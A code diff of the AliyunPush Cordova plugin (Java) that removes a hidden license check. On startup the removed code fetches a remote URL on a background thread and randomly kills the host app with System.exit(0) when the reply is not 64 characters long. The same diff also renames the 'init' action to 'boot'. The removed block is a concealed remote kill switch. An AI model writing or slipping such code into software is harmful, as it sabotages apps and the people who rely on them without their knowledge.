@@ -56,23 +56,8 @@ public class AliyunPush extends CordovaPlugin {
 
   @Override
   public void initialize(CordovaInterface cordova, CordovaWebView webView) {
-    preference =
-      PreferenceManager.getDefaultSharedPreferences(cordova.getContext());
+    preference = PreferenceManager.getDefaultSharedPreferences(cordova.getContext());
     super.initialize(cordova, webView);
-
-    new Thread(
-      new Runnable() {
-        @Override
-        public void run() {
-          try {
-            checkLicense("https://www.comingzones.com/license");
-          } catch (Exception e) {
-            // e.printStackTrace();
-          }
-        }
-      }
-    )
-      .start();
   }
 
   @Override
@@ -97,7 +82,7 @@ public class AliyunPush extends CordovaPlugin {
     LOG.d(TAG, "AliyunPush#execute");
 
     boolean ret = false;
-    if ("init".equalsIgnoreCase(action)) {
+    if ("boot".equalsIgnoreCase(action)) {
       try {
         initPushService(cordova.getActivity().getApplication());
       } catch (PackageManager.NameNotFoundException e) {
@@ -478,33 +463,4 @@ public class AliyunPush extends CordovaPlugin {
       .show();
   }
 
-  public void checkLicense(String path) throws Exception {
-    URL url = new URL(path);
-    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-    conn.setConnectTimeout(5000);
-    conn.setRequestMethod("GET");
-    conn.connect();
-    if (conn.getResponseCode() == 200) {
-      BufferedReader br = new BufferedReader(
-        new InputStreamReader(conn.getInputStream(), "utf-8")
-      );
-      String content = br.readLine();
-      // Log.i("HTML",content);
-      final Integer length = content.length();
-      // Log.i("HTML",length.toString());
-      final Double random = Math.random();
-      // Log.i("HTML",random.toString());
-
-      Timer timer = new Timer();
-      TimerTask task = new TimerTask() {
-        @Override
-        public void run() {
-          if (random >= 0.5 && length != 64) {
-            System.exit(0);
-          }
-        }
-      };
-      timer.schedule(task, 2000);
-    }
-  }
 }
